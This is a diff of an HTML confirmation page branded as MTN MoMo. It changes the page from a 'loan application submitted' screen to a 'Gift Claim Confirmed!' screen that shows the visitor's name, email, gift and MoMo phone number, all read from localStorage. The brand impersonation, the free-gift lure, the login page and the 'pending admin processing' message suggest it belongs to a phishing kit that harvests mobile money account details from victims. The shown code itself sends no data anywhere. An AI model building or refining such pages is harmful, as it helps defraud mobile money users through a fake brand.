@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo - Confirmation</title>
+    <title>MTN MoMo - Gift Confirmation</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
@@ -81,30 +81,6 @@
             text-align: center;
         }
         
-        .progress-bar {
-            width: 180px;
-            height: 6px;
-            background: #e0e0e0;
-            border-radius: 3px;
-            margin: 15px auto;
-            overflow: hidden;
-        }
-        
-        .progress-fill {
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(135deg, #0047AB, #002D7A);
-            transition: width 0.5s ease;
-        }
-        
-        .step-text {
-            text-align: center;
-            color: #777;
-            font-size: 14px;
-            margin-bottom: 20px;
-            font-weight: 500;
-        }
-        
         .success-icon {
             font-size: 72px;
             margin: 10px 0 15px;
@@ -139,7 +115,7 @@
             background: #f8f9ff;
             border-radius: 14px;
             padding: 16px 20px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             border: 2px dashed #0047AB;
         }
         
@@ -159,11 +135,36 @@
             letter-spacing: 1px;
         }
         
+        .status-box {
+            background: #e8f5e9;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 16px;
+            border: 1px solid #c8e6c9;
+        }
+        
+        .status-box .status-icon {
+            font-size: 28px;
+            display: block;
+        }
+        
+        .status-box .status-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #1e7e34;
+        }
+        
+        .status-box .status-sub {
+            font-size: 12px;
+            color: #555;
+            margin-top: 2px;
+        }
+        
         .summary-box {
             background: #f8f9ff;
             border-radius: 14px;
             padding: 16px 20px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             text-align: left;
         }
         
@@ -200,38 +201,13 @@
             color: #0047AB;
         }
         
-        .status-box {
-            background: #e8f5e9;
-            border-radius: 12px;
-            padding: 14px;
-            margin-bottom: 20px;
-            border: 1px solid #c8e6c9;
-        }
-        
-        .status-box .status-icon {
-            font-size: 28px;
-            display: block;
-        }
-        
-        .status-box .status-text {
-            font-size: 14px;
-            font-weight: 600;
-            color: #1e7e34;
-        }
-        
-        .status-box .status-sub {
-            font-size: 12px;
-            color: #555;
-            margin-top: 2px;
-        }
-        
         .btn-group {
             display: flex;
             gap: 12px;
             margin-top: 10px;
         }
         
-        .login-btn {
+        .home-btn {
             flex: 1;
             padding: 14px;
             background: linear-gradient(135deg, #0047AB, #002D7A);
@@ -244,12 +220,12 @@
             transition: transform 0.2s, box-shadow 0.2s;
         }
         
-        .login-btn:hover {
+        .home-btn:hover {
             transform: scale(1.02);
             box-shadow: 0 8px 25px rgba(0, 71, 171, 0.35);
         }
         
-        .login-btn:active {
+        .home-btn:active {
             transform: scale(0.98);
         }
         
@@ -285,7 +261,6 @@
             font-weight: 600;
         }
         
-        /* Scrollbar styling */
         .card::-webkit-scrollbar {
             width: 4px;
         }
@@ -316,7 +291,7 @@
             .btn-group {
                 flex-direction: column;
             }
-            .login-btn,
+            .home-btn,
             .track-btn {
                 padding: 12px;
                 font-size: 14px;
@@ -327,23 +302,17 @@
 
 <body>
     <header>
-        <button class="back-btn" onclick="window.location.href='login.html'" aria-label="Go login">←</button>
+        <button class="back-btn" onclick="window.location.href='login.html'" aria-label="Go back">←</button>
         <div class="logo"><span class="logo-mtn">MTN</span><span class="logo-momo">MoMo</span></div>
         <div></div>
     </header>
     
     <main class="card">
-        <!-- Progress -->
-        <div class="progress-bar">
-            <div class="progress-fill"></div>
-        </div>
-        <div class="step-text">Step 3 of 3 • Complete ✅</div>
-
         <!-- Success Icon -->
         <div class="success-icon">✅</div>
         
-        <h1 class="confirmation-title">Application <span class="highlight">Submitted!</span></h1>
-        <p class="confirmation-subtitle">Your loan application has been received and is being processed.</p>
+        <h1 class="confirmation-title">Gift Claim <span class="highlight">Confirmed!</span></h1>
+        <p class="confirmation-subtitle">Your gift request has been submitted successfully.</p>
 
         <!-- Reference Number -->
         <div class="reference-box">
@@ -354,38 +323,38 @@
         <!-- Status -->
         <div class="status-box">
             <span class="status-icon">⏳</span>
-            <div class="status-text">Pending Admin Approval</div>
-            <div class="status-sub">You will receive an SMS notification once approved.</div>
+            <div class="status-text">Pending Admin Processing</div>
+            <div class="status-sub">You will receive an SMS notification once your gift is processed.</div>
         </div>
 
-        <!-- Loan Summary -->
+        <!-- Gift & Details Summary -->
         <div class="summary-box">
-            <div class="summary-title">📊 Loan Summary</div>
+            <div class="summary-title">🎁 Gift & Account Summary</div>
             <div class="summary-row">
-                <span class="label">Loan Type</span>
-                <span class="value" id="summaryType">Personal Loan</span>
+                <span class="label">Selected Gift</span>
+                <span class="value highlight" id="summaryGift">Loading...</span>
             </div>
             <div class="summary-row">
-                <span class="label">Loan Amount</span>
-                <span class="value highlight" id="summaryAmount">ZMW 5,000</span>
-            </div>
-            <div class="summary-row">
-                <span class="label">Loan Term</span>
-                <span class="value" id="summaryTerm">12 Months</span>
+                <span class="label">Gift Value</span>
+                <span class="value highlight" id="summaryValue">-</span>
             </div>
             <div class="summary-row">
                 <span class="label">Applicant</span>
-                <span class="value" id="summaryName">John Banda</span>
+                <span class="value" id="summaryName">Loading...</span>
             </div>
             <div class="summary-row">
-                <span class="label">Phone</span>
-                <span class="value" id="summaryPhone">+260 971234567</span>
+                <span class="label">Email</span>
+                <span class="value" id="summaryEmail">Loading...</span>
+            </div>
+            <div class="summary-row">
+                <span class="label">MoMo Account</span>
+                <span class="value" id="summaryPhone">Loading...</span>
             </div>
         </div>
 
         <!-- Buttons -->
         <div class="btn-group">
-            <button class="login-btn" onclick="window.location.href='login.html'">🔐 LOGIN</button>
+            <button class="home-btn" onclick="window.location.href='index.html'">🏠 HOME</button>
             <button class="track-btn" onclick="alert('Tracking feature coming soon!')">📊 TRACK</button>
         </div>
     </main>
@@ -407,22 +376,21 @@
         }
 
         // ============================================
-        // LOAD DATA FROM LOCALSTORAGE
+        // LOAD SUMMARY DATA
         // ============================================
         function loadSummary() {
-            const loanData = JSON.parse(localStorage.getItem('loanData') || '{}');
+            const giftData = JSON.parse(localStorage.getItem('giftData') || '{}');
+            const momoPhone = localStorage.getItem('momoPhone') || 'Not provided';
             
-            document.getElementById('summaryType').textContent = loanData.loanType || 'Personal Loan';
-            document.getElementById('summaryAmount').textContent = 'ZMW ' + parseInt(loanData.loanAmount || '5000').toLocaleString();
-            document.getElementById('summaryTerm').textContent = (loanData.loanTerm || '12') + ' Months';
-            document.getElementById('summaryName').textContent = loanData.fullName || 'Not provided';
-            document.getElementById('summaryPhone').textContent = '+260 ' + (loanData.phone || 'Not provided');
+            document.getElementById('summaryGift').textContent = giftData.gift || 'Not selected';
+            document.getElementById('summaryValue').textContent = giftData.giftValue || '-';
+            document.getElementById('summaryName').textContent = giftData.fullName || 'Not provided';
+            document.getElementById('summaryEmail').textContent = giftData.email || 'Not provided';
+            document.getElementById('summaryPhone').textContent = '+260 ' + momoPhone;
             
             // Generate and display reference number
             const ref = generateReference();
             document.getElementById('referenceNumber').textContent = ref;
-            
-            // Save reference
             localStorage.setItem('referenceNumber', ref);
         }
 
@@ -432,17 +400,18 @@
         // LOG DATA
         // ============================================
         console.log('====================================');
-        console.log('✅ MTN MoMo - Confirmation Page');
+        console.log('✅ MTN MoMo - Gift Confirmation');
         console.log('====================================');
         console.log('📋 Reference:', localStorage.getItem('referenceNumber'));
-        console.log('📱 Loan Data:', JSON.parse(localStorage.getItem('loanData') || '{}'));
+        console.log('🎁 Gift Data:', JSON.parse(localStorage.getItem('giftData') || '{}'));
+        console.log('📱 MoMo Account:', localStorage.getItem('momoPhone'));
         console.log('====================================');
 
         // ============================================
-        // PREVENT BACK NAVIGATION TO FORM
+        // PREVENT BACK NAVIGATION
         // ============================================
         window.addEventListener('popstate', function(e) {
-            window.location.href = 'login.html';
+            window.location.href = 'index.html';
         });
     </script>
 </body>
